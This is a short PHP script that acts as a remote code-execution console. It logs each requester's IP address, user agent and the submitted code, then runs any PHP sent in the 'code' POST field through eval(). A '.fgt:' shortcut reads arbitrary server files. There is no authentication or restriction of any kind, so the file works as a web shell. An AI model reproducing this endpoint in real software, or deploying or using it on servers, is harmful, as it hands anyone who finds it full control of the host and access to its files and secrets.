<?php
  if(array_key_exists('code',$_POST))
  {
    call_user_func
    (
      function()
      {
        $log_dir="eval_logs";
        if(!is_dir($log_dir)){mkdir($log_dir);}
        $log_filename=dirname(__FILE__)."/".$log_dir."/".gmdate("Y-m-d").".log";
        $log_flag=file_exists($log_filename);
        $log_object=array();
        $log_object['time'] = gmdate('Y-m-d H-i-s');
        $log_object['ip'] = getenv('REMOTE_ADDR');
        $log_object['request_uri'] = getenv('REQUEST_URI');
        $log_object['user_agent'] = getenv('HTTP_USER_AGENT');
        $log_object['referrer'] = getenv('HTTP_REFERER');
        $log_object['code']=$_POST['code'];
        $log_object['data']=array_key_exists('data',$_POST)?$_POST['data']:"";
        $log_string=$log_flag?"\n":"";
        $log_string.=json_encode($log_object);
        $fd=fopen($log_filename,"a");
        fwrite($fd,$log_string);
        fclose($fd);
      }
    );
    if(substr($_POST['code'],0,strlen(".fgt:"))==".fgt:"){
      $_POST['code']="header(\"content-type: text/plain\");\necho file_get_contents(".substr($_POST['code'],strlen(".fgt:")).");";
    }
    if(substr($_POST['code'],0,strlen("echo file_get_contents"))=="echo file_get_contents"){
      $_POST['code']="header(\"content-type: text/plain\");\n".$_POST['code'];
    }
    eval($_POST['code']);
  }else{
    echo file_get_contents(dirname(__FILE__)."/eval.html");
  }
?>
